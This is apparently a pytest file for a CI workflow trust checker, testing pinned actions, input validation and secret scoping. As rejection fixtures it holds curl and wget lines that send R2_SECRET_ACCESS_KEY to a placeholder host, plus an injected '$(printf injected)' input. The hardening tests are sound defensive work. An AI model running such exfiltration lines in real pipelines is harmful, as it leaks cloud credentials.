from __future__ import annotations

import hashlib
import socket
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path

import pytest
import yaml
from tools.cloud.validate_workflow_inputs import (
    WorkflowInputError,
    validate_backfill_inputs,
    validate_daily_input,
)
from tools.drift.check_workflow_trust import check, check_workflow

ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = ROOT / ".github" / "workflows"

CHECKOUT_SHA = "3d3c42e5aac5ba805825da76410c181273ba90b1"
R2_CREDENTIAL_NAMES = {"R2_ACCOUNT_ID", "R2_ACCESS_KEY_ID", "R2_SECRET_ACCESS_KEY"}
EXPECTED_CREDENTIAL_NAMES = {
    "Pull stores": R2_CREDENTIAL_NAMES,
    "Pull the market store": R2_CREDENTIAL_NAMES,
    "Run daily batch": {"JQUANTS_API_KEY", "ESTAT_APP_ID", "EDINET_API_KEY"},
    "Upload machine stores and serving views": R2_CREDENTIAL_NAMES,
    "Publish serving history and freshness": R2_CREDENTIAL_NAMES,
    "Upload serving objects": R2_CREDENTIAL_NAMES,
    "Upload run summary": R2_CREDENTIAL_NAMES,
    "Notify Discord #batch-runs": {"DISCORD_WEBHOOK_URL"},
    "Backfill and publish committed progress": {
        *R2_CREDENTIAL_NAMES,
        "JQUANTS_API_KEY",
    },
    "Deploy Worker and UI assets": {"CLOUDFLARE_API_TOKEN", "CLOUDFLARE_ACCOUNT_ID"},
}
EXPECTED_COMMAND_DIGESTS = {
    "Pull stores": "f10acd1ea74423745ea80b3d3ee8d4e94e18ec94147bde133706bebcfafecfc8",
    "Pull the market store": "938b1c2bd6098ce32f515950463f176acac30d0a9ad51381a3f441a4a64d437a",
    "Run daily batch": "896f41273c2c8f78d3deadfa52f3df807c762249e968f71b0e95621058f9c0e3",
    "Upload machine stores and serving views": (
        "d39adb2a5f7b443c94f37d3f5653ef5705a1a373a5436b1dda2691c19a597008"
    ),
    "Publish serving history and freshness": (
        "71bc4dd9419cf796a7f8eb89501f7d0cd25e1984a516b37c827e5a388d898034"
    ),
    "Upload serving objects": "4dda53ab8d22b3cd5a70f98719f4cf0847360c2612a7cae07e3140baf3c660f3",
    "Upload run summary": "7ce1363c5436f3bfd4a93fe01d8c36520dd8d296c041950a167c418aae483cd6",
    "Notify Discord #batch-runs": (
        "96ef74cbfaa5c6cab4e92db31a5f2262f6e36578fea21ffcb0a79913030cb482"
    ),
    "Backfill and publish committed progress": (
        "e3a872c155847e6943dee858c4c1a28a4ad6dc2ef8560d67bdb305fc41eac589"
    ),
    "Deploy Worker and UI assets": (
        "cf2ce1d4ea6356847ba8e230a865b1c0c15e2a1726202a660cef7991e900bd77"
    ),
}
VALID_WORKFLOW = f"""\
name: fixture
on: push
jobs:
  quality:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{CHECKOUT_SHA} # v7.0.1
      - name: Harmless
        run: echo ok
"""


def _fixture(tmp_path: Path, text: str, *, name: str = "fixture.yml") -> Path:
    path = tmp_path / name
    path.write_text(text, encoding="utf-8")
    return path


def test_current_workflows_satisfy_the_trust_gate() -> None:
    assert check(ROOT) == []


@pytest.mark.parametrize(
    "expression",
    [
        "${{ inputs.asof }}",
        "${{ inputs['asof'] }}",
        "${{ github.event.inputs.asof }}",
        "${{ github.event['inputs']['asof'] }}",
        "${{ github['event']['inputs']['asof'] }}",
    ],
)
def test_direct_dispatch_expression_in_run_is_rejected(tmp_path: Path, expression: str) -> None:
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace("echo ok", f'echo "{expression}"'),
    )

    errors = check_workflow(path)

    assert any("inputs.* must pass through step env" in error for error in errors)


def test_dispatch_input_expression_outside_validation_env_is_rejected(tmp_path: Path) -> None:
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace(
            "      - name: Harmless\n",
            "      - name: Harmless\n        env:\n          VALUE: ${{ inputs.asof }}\n",
        ),
    )

    errors = check_workflow(path)

    assert any("dispatch input is outside its validation step env" in error for error in errors)


@pytest.mark.parametrize(
    ("old", "new", "expected"),
    [
        (
            'python3 -m tools.cloud.validate_workflow_inputs daily --asof "$MANUAL_ASOF"',
            "true",
            "validation command must match the fail-closed contract",
        ),
        (
            'python3 -m tools.cloud.validate_workflow_inputs daily --asof "$MANUAL_ASOF"',
            'python3 -m tools.cloud.validate_workflow_inputs daily --asof "$MANUAL_ASOF" || true',
            "validation command must match the fail-closed contract",
        ),
        (
            "        id: validate-input\n",
            "        id: validate-input\n        continue-on-error: true\n",
            "validation step must not set continue-on-error",
        ),
        (
            "        id: validate-input\n",
            "        id: validate-input\n        shell: bash {0}\n",
            "validation step must not set shell",
        ),
    ],
)
def test_validation_step_fail_closed_contract_rejects_mutation(
    tmp_path: Path,
    old: str,
    new: str,
    expected: str,
) -> None:
    text = (WORKFLOWS / "cloud-daily-batch.yml").read_text(encoding="utf-8")
    assert old in text
    path = _fixture(tmp_path, text.replace(old, new, 1), name="cloud-daily-batch.yml")

    errors = check_workflow(path)

    assert any(expected in error for error in errors)


def test_validated_output_cannot_be_replaced_with_raw_dispatch_input(tmp_path: Path) -> None:
    text = (WORKFLOWS / "cloud-daily-batch.yml").read_text(encoding="utf-8")
    path = _fixture(
        tmp_path,
        text.replace(
            "${{ steps.validate-input.outputs.asof }}",
            "${{ github['event']['inputs']['asof'] }}",
            1,
        ),
        name="cloud-daily-batch.yml",
    )

    errors = check_workflow(path)

    assert any("dispatch input is outside its validation step env" in error for error in errors)


@pytest.mark.parametrize(
    "unknown_command",
    [
        'curl -fsS https://example.invalid/?key="$R2_SECRET_ACCESS_KEY"',
        'wget -qO- https://example.invalid/?key="$R2_SECRET_ACCESS_KEY"',
        "python3 -c \"import urllib.request; urllib.request.urlopen('https://example.invalid')\"",
    ],
)
def test_credential_step_rejects_any_unreviewed_command(
    tmp_path: Path, unknown_command: str
) -> None:
    text = (WORKFLOWS / "cloud-daily-batch.yml").read_text(encoding="utf-8")
    path = _fixture(
        tmp_path,
        text.replace(
            "          tools/cloud/r2_transfer.sh pull-app",
            f"          tools/cloud/r2_transfer.sh pull-app\n          {unknown_command}",
            1,
        ),
        name="cloud-daily-batch.yml",
    )

    errors = check_workflow(path)

    assert any("credential-bearing step differs" in error for error in errors)


@pytest.mark.parametrize(
    "injection",
    [
        "    env:\n      TOKEN: ${{ secrets.JQUANTS_API_KEY }}\n",
        "      - name: Harmless\n        with:\n          token: ${{ secrets.JQUANTS_API_KEY }}\n",
        "      - name: Harmless\n        env:\n          TOKEN: ${{ secrets['JQUANTS_API_KEY'] }}\n",
        "      - name: Harmless\n        env:\n          TOKEN: ${{ secrets.UNRELATED }}\n",
    ],
)
def test_secret_outside_an_approved_target_step_env_is_rejected(
    tmp_path: Path, injection: str
) -> None:
    marker = "    steps:\n" if injection.startswith("    env:") else "      - name: Harmless\n"
    text = VALID_WORKFLOW.replace(marker, injection + marker)
    path = _fixture(tmp_path, text)

    errors = check_workflow(path)

    assert any("credential is outside its target step env" in error for error in errors)


@pytest.mark.parametrize(
    ("reference", "comment", "expected"),
    [
        ("actions/checkout@v7", "", "must use reviewed full commit SHA"),
        ("actions/checkout@3d3c42e5", "# v7.0.1", "must use reviewed full commit SHA"),
        (
            f"actions/checkout@{CHECKOUT_SHA}",
            "",
            "must carry release comment v7.0.1",
        ),
        (
            f"actions/checkout@{CHECKOUT_SHA}",
            "# v7.0.0",
            "must carry release comment v7.0.1",
        ),
        (
            "untrusted/example@0123456789abcdef0123456789abcdef01234567",
            "# v1.2.3",
            "unreviewed external action",
        ),
    ],
)
def test_mutable_or_unreviewed_action_reference_is_rejected(
    tmp_path: Path,
    reference: str,
    comment: str,
    expected: str,
) -> None:
    replacement = f"      - uses: {reference}"
    if comment:
        replacement += f" {comment}"
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace(
            f"      - uses: actions/checkout@{CHECKOUT_SHA} # v7.0.1",
            replacement,
        ),
    )

    errors = check_workflow(path)

    assert any(expected in error for error in errors)


def test_inline_action_reference_cannot_bypass_release_comment_check(tmp_path: Path) -> None:
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace(
            f"      - uses: actions/checkout@{CHECKOUT_SHA} # v7.0.1",
            f"      - {{uses: actions/checkout@{CHECKOUT_SHA}}}",
        ),
    )

    errors = check_workflow(path)

    assert any("external uses must be a standalone pinned line" in error for error in errors)


def test_uses_text_inside_a_run_script_is_not_treated_as_an_action(tmp_path: Path) -> None:
    path = _fixture(
        tmp_path,
        VALID_WORKFLOW.replace("run: echo ok", "run: |\n          echo 'uses: prose@tag'"),
    )

    assert check_workflow(path) == []


def test_yaml_extension_is_included_in_repository_scan(tmp_path: Path) -> None:
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "fixture.yaml").write_text(
        VALID_WORKFLOW.replace("echo ok", 'echo "${{ inputs.asof }}"'),
        encoding="utf-8",
    )

    errors = check(tmp_path)

    assert any(error.startswith("fixture.yaml:") for error in errors)


def _workflow(name: str) -> dict[str, object]:
    loaded = yaml.load((WORKFLOWS / name).read_text(encoding="utf-8"), Loader=yaml.BaseLoader)
    assert isinstance(loaded, dict)
    return loaded


def _steps(name: str, job_name: str) -> list[dict[str, object]]:
    workflow = _workflow(name)
    jobs = workflow["jobs"]
    assert isinstance(jobs, dict)
    job = jobs[job_name]
    assert isinstance(job, dict)
    steps = job["steps"]
    assert isinstance(steps, list)
    return steps


@dataclass
class WorkflowCommandStub:
    """Record workflow boundaries without executing a command or opening a socket."""

    invocations: list[tuple[str, dict[str, str], str]] = field(default_factory=list)

    def invoke(self, step: dict[str, object]) -> None:
        name = str(step.get("name", step.get("uses", "unnamed")))
        raw_env = step.get("env", {})
        assert isinstance(raw_env, dict)
        credentials = {
            str(key): f"stub-value:{key}"
            for key, value in raw_env.items()
            if "${{ secrets." in str(value) or str(value) == "${{ vars.R2_ACCOUNT_ID }}"
        }
        command = _normalize_command(str(step.get("run", step.get("uses", ""))))
        self.invocations.append((name, credentials, command))


def _normalize_command(script: str) -> str:
    lines = script.splitlines()
    while lines and not lines[0].strip():
        lines.pop(0)
    while lines and not lines[-1].strip():
        lines.pop()
    if not lines:
        return ""
    indentation = min(len(line) - len(line.lstrip()) for line in lines if line.strip())
    return "\n".join(line[indentation:].rstrip() for line in lines)


def _simulate(
    *,
    workflow_name: str,
    job_name: str,
    inputs: dict[str, str],
    fail_step: str | None = None,
) -> WorkflowCommandStub:
    stub = WorkflowCommandStub()
    failed = False
    validation_succeeded = False
    for step in _steps(workflow_name, job_name):
        name = str(step.get("name", step.get("uses", "unnamed")))
        condition = str(step.get("if", ""))
        always = "always()" in condition
        if failed and not always:
            continue
        if "steps.validate-input.outcome == 'success'" in condition and not validation_succeeded:
            continue
        try:
            if name == "Validate dispatch input":
                validate_daily_input(asof=inputs.get("asof", ""))
                validation_succeeded = True
            elif name == "Validate dispatch inputs":
                validate_backfill_inputs(
                    start=inputs.get("start", ""),
                    end=inputs.get("end", ""),
                    master_month_end_from=inputs.get("master_month_end_from", ""),
                )
                validation_succeeded = True
        except WorkflowInputError:
            failed = True
        stub.invoke(step)
        if name == fail_step:
            failed = True
    return stub


def _credential_invocations(stub: WorkflowCommandStub) -> dict[str, dict[str, str]]:
    return {name: credentials for name, credentials, _command in stub.invocations if credentials}


@pytest.mark.parametrize(
    ("workflow_name", "job_name", "inputs", "fail_step", "expected_steps"),
    [
        (
            "cloud-history-backfill.yml",
            "backfill",
            {"start": "2026-01-01", "end": "2026-08-01"},
            None,
            {
                "Pull the market store",
                "Backfill and publish committed progress",
            },
        ),
        (
            "cloud-history-backfill.yml",
            "backfill",
            {"start": "2026-08-02", "end": "2026-08-01"},
            None,
            set(),
        ),
        (
            "cloud-daily-batch.yml",
            "daily",
            {"asof": ""},
            None,
            {
                "Pull stores",
                "Run daily batch",
                "Upload machine stores and serving views",
                "Publish serving history and freshness",
                "Notify Discord #batch-runs",
                "Upload run summary",
            },
        ),
        (
            "cloud-daily-batch.yml",
            "daily",
            {"asof": "2026-08-01"},
            None,
            {
                "Pull stores",
                "Run daily batch",
                "Upload machine stores and serving views",
                "Publish serving history and freshness",
                "Notify Discord #batch-runs",
                "Upload run summary",
            },
        ),
        (
            "cloud-daily-batch.yml",
            "daily",
            {"asof": "$(printf injected)"},
            None,
            {"Notify Discord #batch-runs"},
        ),
        (
            "cloud-daily-batch.yml",
            "daily",
            {"asof": "2026-08-01"},
            "Run daily batch",
            {
                "Pull stores",
                "Run daily batch",
                "Notify Discord #batch-runs",
                "Upload run summary",
            },
        ),
        (
            "cloud-materialize.yml",
            "materialize",
            {},
            None,
            {"Pull stores", "Upload serving objects"},
        ),
        (
            "web.yml",
            "quality",
            {},
            None,
            {"Deploy Worker and UI assets"},
        ),
    ],
)
def test_deterministic_workflow_stub_exposes_credentials_only_to_target_steps(
    workflow_name: str,
    job_name: str,
    inputs: dict[str, str],
    fail_step: str | None,
    expected_steps: set[str],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    network_attempts: list[str] = []

    def reject_network(*_args: object, **_kwargs: object) -> None:
        network_attempts.append("network")
        raise AssertionError("workflow stub attempted a real network request")

    monkeypatch.setattr(socket, "create_connection", reject_network)
    monkeypatch.setattr(socket.socket, "connect", reject_network)
    monkeypatch.setattr(urllib.request, "urlopen", reject_network)
    stub = _simulate(
        workflow_name=workflow_name,
        job_name=job_name,
        inputs=inputs,
        fail_step=fail_step,
    )

    credential_invocations = _credential_invocations(stub)
    assert set(credential_invocations) == expected_steps
    assert {
        step_name: set(credentials) for step_name, credentials in credential_invocations.items()
    } == {step_name: EXPECTED_CREDENTIAL_NAMES[step_name] for step_name in expected_steps}
    assert all(
        value == f"stub-value:{name}"
        for credentials in credential_invocations.values()
        for name, value in credentials.items()
    )
    command_digests = {
        name: hashlib.sha256(command.encode()).hexdigest()
        for name, credentials, command in stub.invocations
        if credentials
    }
    assert command_digests == {name: EXPECTED_COMMAND_DIGESTS[name] for name in expected_steps}
    assert all(command for _name, _credentials, command in stub.invocations)
    assert network_attempts == []
